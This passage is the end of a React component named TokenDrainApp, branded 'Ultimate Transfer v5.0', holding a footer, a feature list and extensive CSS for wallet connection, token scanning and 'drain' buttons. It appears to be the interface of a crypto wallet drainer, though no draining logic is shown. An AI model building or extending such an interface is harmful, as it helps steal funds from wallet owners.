                    <div className="feature-desc">20+ EVM networks supported</div>
                  </div>
                  <div className="feature">
                    <div className="feature-icon">📱</div>
                    <div className="feature-title">Mobile Ready</div>
                    <div className="feature-desc">Works in all wallet browsers</div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="footer-status">
              <span className="status-dot active"></span>
              System Online
            </span>
            <span>•</span>
            <span>Ultimate Transfer v5.0</span>
            <span>•</span>
            <span>{backendOnline ? 'Backend Connected' : 'Backend Offline'}</span>
            {lastScanTime && (
              <>
                <span>•</span>
                <span>Last scan: {new Date(lastScanTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
              </>
            )}
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 1px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 800;
          color: #ef4444;
          letter-spacing: -0.5px;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
          font-weight: 500;
        }
        
        /* Connect Button */
        .custom-connect-btn {
          background: linear-gradient(135deg, #ef4444, #dc2626);
          color: white;
          border: none;
          padding: 14px 28px;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          box-shadow: 0 4px 12px rgba(239, 68, 68, 0.25);
        }
        
        .custom-connect-btn:hover {
          background: linear-gradient(135deg, #dc2626, #b91c1c);
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(239, 68, 68, 0.35);
        }
        
        .connect-prompt {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .connect-icon {
          font-size: 20px;
        }
        
        .connect-text {
          font-weight: 600;
        }
        
        /* Connected Wallet */
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 15px;
          background: #222;
          padding: 10px 15px;
          border-radius: 12px;
          border: 1px solid #333;
        }
        
        .wallet-info {
          display: flex;
          flex-direction: column;
          gap: 5px;
        }
        
        .wallet-address {
          font-family: 'Roboto Mono', monospace;
          font-size: 14px;
          font-weight: 500;
          color: white;
        }
        
        .wallet-type {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 12px;
          color: #3b82f6;
          background: rgba(59, 130, 246, 0.1);
          padding: 4px 8px;
          border-radius: 6px;
        }
        
        .wallet-type-icon {
          font-size: 12px;
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 16px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 500;
          transition: background 0.3s;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
          border-radius: 16px;
          padding: 25px;
          display: flex;
          align-items: center;
          gap: 20px;
          margin-bottom: 20px;
          border: 1px solid rgba(59, 130, 246, 0.3);
          position: relative;
        }
        
        .status-card.success {
          background: linear-gradient(135deg, #065f46, #10b981);
          border-color: rgba(16, 185, 129, 0.3);
        }
        
        .status-icon {
          font-size: 36px;
          display: flex;
          align-items: center;
          justify-content: center;
          width: 60px;
          height: 60px;
          background: rgba(255, 255, 255, 0.1);
          border-radius: 12px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: rgba(255, 255, 255, 0.9);
          text-transform: uppercase;
          letter-spacing: 1.5px;
          margin-bottom: 8px;
          font-weight: 600;
        }
        
        .status-message {
          font-size: 20px;
          font-weight: 700;
          color: white;
          line-height: 1.4;
        }
        
        .status-badge {
          position: absolute;
          top: 20px;
          right: 20px;
          background: rgba(255, 255, 255, 0.2);
          color: white;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
          backdrop-filter: blur(10px);
        }
        
        .stats-row {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 15px;
        }
        
        .stat {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
          transition: transform 0.3s;
        }
        
        .stat:hover {
          transform: translateY(-2px);
          border-color: #444;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 800;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 13px;
          text-transform: uppercase;
          letter-spacing: 1px;
          font-weight: 600;
        }
        
        /* Controls */
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 18px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
          transform: none !important;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(59, 130, 246, 0.3);
        }
        
        .btn-scanning {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          color: white;
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #16a34a, #22c55e);
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: linear-gradient(135deg, #15803d, #16a34a);
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(34, 197, 94, 0.3);
        }
        
        .btn-processing {
          background: linear-gradient(135deg, #15803d, #16a34a);
          color: white;
        }
        
        .btn-small {
          padding: 8px 16px;
          background: #333;
          color: white;
          border: none;
          border-radius: 8px;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          transition: background 0.3s;
        }
        
        .btn-small:hover {
          background: #444;
        }
        
        .btn-transfer {
          padding: 6px 12px;
          background: rgba(34, 197, 94, 0.2);
          color: #22c55e;
          border: 1px solid rgba(34, 197, 94, 0.3);
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
        }
        
        .btn-transfer:hover:not(:disabled) {
          background: rgba(34, 197, 94, 0.3);
        }
        
        .btn-transfer:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .spinner {
          width: 16px;
          height: 16px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        /* Tokens Panel */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 25px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
          margin-bottom: 25px;
        }
        
        .panel-title h3 {
          margin: 0;
          font-size: 20px;
          color: white;
          font-weight: 700;
          margin-bottom: 5px;
        }
        
        .panel-subtitle {
          color: #888;
          font-size: 14px;
        }
        
        .panel-actions {
          display: flex;
          gap: 10px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.3s;
        }
        
        .token-card:hover {
          border-color: #444;
          transform: translateY(-2px);
        }
        
        .token-card.processing {
          border-color: #3b82f6;
          background: rgba(59, 130, 246, 0.05);
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 15px;
        }
        
        .token-icon {
          width: 50px;
          height: 50px;
          background: linear-gradient(135deg, #ef4444, #dc2626);
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-info {
          flex: 1;
        }
        
        .token-name-row {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 5px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 18px;
          color: white;
        }
        
        .token-network-badge {
          color: #888;
          font-size: 11px;
          background: rgba(136, 136, 136, 0.1);
          padding: 2px 6px;
          border-radius: 4px;
          font-weight: 600;
        }
        
        .token-amount-row {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .token-amount {
          color: white;
          font-size: 16px;
          font-weight: 600;
        }
        
        .token-usd-value {
          color: #22c55e;
          font-size: 14px;
          font-weight: 600;
        }
        
        .token-actions {
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        
        .token-status {
          font-size: 12px;
          font-weight: 600;
          padding: 4px 8px;
          border-radius: 6px;
        }
        
        .token-status.detected {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-status.processing {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 25px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 1px solid #333;
        }
        
        .transaction-icon {
          font-size: 24px;
          width: 40px;
          height: 40px;
          display: flex;
          align-items: center;
          justify-content: center;
          background: rgba(59, 130, 246, 0.1);
          border-radius: 8px;
        }
        
        .transaction-details {
          flex: 1;
        }
        
        .transaction-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 5px;
        }
        
        .transaction-symbol {
          font-weight: 600;
          font-size: 16px;
          color: white;
        }
        
        .transaction-amount {
          color: #ddd;
          font-size: 14px;
        }
        
        .transaction-network {
          color: #888;
          font-size: 12px;
          background: rgba(136, 136, 136, 0.1);
          padding: 2px 6px;
          border-radius: 4px;
        }
        
        .transaction-hash {
          color: #3b82f6;
          font-size: 12px;
          font-family: 'Roboto Mono', monospace;
          margin-bottom: 5px;
        }
        
        .transaction-message {
          color: #22c55e;
          font-size: 13px;
          font-weight: 500;
        }
        
        .transaction-status {
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
          min-width: 100px;
          text-align: center;
        }
        
        .transaction-status.processing {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
        }
        
        .transaction-status.completed {
          background: rgba(34, 197, 94, 0.2);
          color: #22c55e;
        }
        
        /* Empty State */
        .empty-state {
          text-align: center;
          padding: 60px 20px;
          background: #222;
          border-radius: 16px;
          border: 1px solid #333;
          margin-bottom: 20px;
        }
        
        .empty-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .empty-state h3 {
          font-size: 24px;
          color: white;
          margin-bottom: 10px;
        }
        
        .empty-message {
          color: #888;
          font-size: 16px;
          max-width: 500px;
          margin: 0 auto 30px;
          line-height: 1.6;
        }
        
        /* Error Alert */
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 1px solid #ef4444;
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-content {
          flex: 1;
        }
        
        .error-title {
          font-size: 16px;
          font-weight: 600;
          color: white;
          margin-bottom: 5px;
        }
        
        .error-message {
          color: rgba(255, 255, 255, 0.9);
          font-size: 14px;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 800px;
          margin: 0 auto;
        }
        
        .welcome-hero {
          margin-bottom: 40px;
        }
        
        .welcome-icon {
          font-size: 80px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 40px;
          font-size: 18px;
          line-height: 1.6;
          max-width: 600px;
          margin-left: auto;
          margin-right: auto;
        }
        
        .connect-section {
          margin-bottom: 60px;
        }
        
        .features-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 20px;
          margin-top: 40px;
        }
        
        .feature {
          background: #222;
          border-radius: 16px;
          padding: 25px 20px;
          text-align: center;
          border: 1px solid #333;
          transition: transform 0.3s;
        }
        
        .feature:hover {
          transform: translateY(-5px);
          border-color: #444;
        }
        
        .feature-icon {
          font-size: 32px;
          margin-bottom: 15px;
        }
        
        .feature-title {
          font-size: 18px;
          font-weight: 600;
          color: white;
          margin-bottom: 8px;
        }
        
        .feature-desc {
          color: #888;
          font-size: 14px;
          line-height: 1.5;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
          flex-wrap: wrap;
        }
        
        .footer-status {
          display: flex;
          align-items: center;
          gap: 6px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #22c55e;
          border-radius: 50%;
        }
        
        .status-dot.active {
          background: #22c55e;
          animation: pulse 2s infinite;
        }
        
        /* Progress Bar */
        .scan-progress {
          margin-top: 15px;
        }
        
        .progress-bar {
          height: 6px;
          background: rgba(255, 255, 255, 0.1);
          border-radius: 3px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #3b82f6, #22c55e);
          transition: width 0.3s;
        }
        
        .progress-text {
          font-size: 12px;
          color: #888;
          margin-top: 5px;
          text-align: right;
        }
        
        /* Mobile Styles */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          
          .connected-wallet {
            flex-direction: column;
            gap: 15px;
            width: 100%;
          }
          
          .stats-row {
            grid-template-columns: repeat(2, 1fr);
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .features-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
        }
        
        @media (max-width: 480px) {
          .app-container {
            padding: 10px;
          }
          
          .status-card {
            flex-direction: column;
            text-align: center;
            gap: 15px;
            padding: 20px;
          }
          
          .status-badge {
            position: relative;
            top: 0;
            right: 0;
            margin-top: 10px;
            align-self: center;
          }
          
          .token-header {
            flex-direction: column;
            text-align: center;
            gap: 10px;
          }
          
          .token-actions {
            flex-direction: column;
            gap: 10px;
          }
          
          .transaction-item {
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
          }
          
          .transaction-details {
            width: 100%;
          }
          
          .transaction-status {
            align-self: flex-start;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
